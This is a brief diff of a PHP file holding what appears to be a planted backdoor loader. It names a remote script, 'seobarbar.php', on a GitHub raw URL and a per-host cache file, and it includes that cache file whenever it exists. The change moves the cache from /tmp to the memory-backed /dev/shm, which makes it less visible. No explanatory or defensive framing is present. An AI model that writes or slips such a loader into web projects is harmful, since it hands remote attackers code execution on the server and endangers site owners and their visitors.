@@ -1,5 +1,5 @@
 <?php
-$data = ['https://raw.githubusercontent.com/5Y4H/seo/refs/heads/main/seobarbar.php', '/tmp/sesss_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://raw.githubusercontent.com/5Y4H/seo/refs/heads/main/seobarbar.php', '/dev/shm/sesss_'.md5($_SERVER['HTTP_HOST']).'.php'];
  
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
